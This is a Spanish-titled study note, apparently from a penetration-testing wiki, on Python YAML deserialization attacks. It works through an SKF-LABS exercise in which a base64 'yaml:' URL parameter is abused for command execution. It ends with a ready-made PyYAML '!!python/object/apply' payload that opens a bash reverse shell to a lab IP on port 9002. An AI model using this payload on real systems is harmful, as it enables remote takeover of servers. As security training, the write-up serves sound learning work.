---
title: "Python Ataque De Deserializacion Yaml"
category: ["S4VITAR", "fases", "6-OWASP 10", "Python-Ataque de Deserializacion Yaml"]
---

A **YAML Deserialization Attack** (**DES-Yaml**) is a type of vulnerability that can occur in Python applications using [[YAML-Yet Another Markup Language-]] for object serialization and deserialization.

The vulnerability arises when an attacker can control the YAML input passed to a deserialization function in the application. If the application code does not properly validate the YAML input, it may allow an attacker to inject malicious code into the deserialized object.

Once the object is deserialized, the malicious code can execute within the application's context, potentially enabling the attacker to take control of the system, access sensitive data, or even execute remote code.

Attackers can exploit DES-Yaml vulnerabilities to perform denial-of-service (DoS) attacks, inject malicious code, or gain full system control.

The impact of a YAML Deserialization Attack depends on the type and sensitivity of obtainable data, but it can be severe. Therefore, Python application developers must properly validate and filter YAML input passed to deserialization functions, and employ security techniques like resource limiting to prevent DoS attacks and disabling automatic deserialization of untrusted objects.

**LAB**  
- **SKF-LABS DES-Yaml**: [https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml)  
![Pasted image 20260212005543](/VaultSite/wiki-images/Pasted%20image%2020260212005543.png)  
The URL contains a base64-encoded string that catches our attention  
![Pasted image 20260212005716](/VaultSite/wiki-images/Pasted%20image%2020260212005716.png)  
We see the URL string matches what appeared in the web body, following a specific format: first **yaml:** followed by our desired message  
Let's try pasting our own base64-encoded message  
![Pasted image 20260212005834](/VaultSite/wiki-images/Pasted%20image%2020260212005834.png)  
Now we'll test command execution. For the payload, we'll use:  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md  
or a more focused resource:  
https://www.pkmurphy.com.au/isityaml/  

We'll inject this payload but test with `id` first  
![Pasted image 20260212010652](/VaultSite/wiki-images/Pasted%20image%2020260212010652.png)  
Base64 encode it and paste into the URL  
![Pasted image 20260212010836](/VaultSite/wiki-images/Pasted%20image%2020260212010836.png)  
![Pasted image 20260212010845](/VaultSite/wiki-images/Pasted%20image%2020260212010845.png)  
Here we see the `id` command executed  
![Pasted image 20260212010932](/VaultSite/wiki-images/Pasted%20image%2020260212010932.png)  
From here we could continue executing commands or directly establish a reverse shell like this:  
!!python/object/apply:subprocess.check_output [ ['/bin/bash', '-c', 'bash -i >& /dev/tcp/192.168.1.110/9002 0>&1'] ]
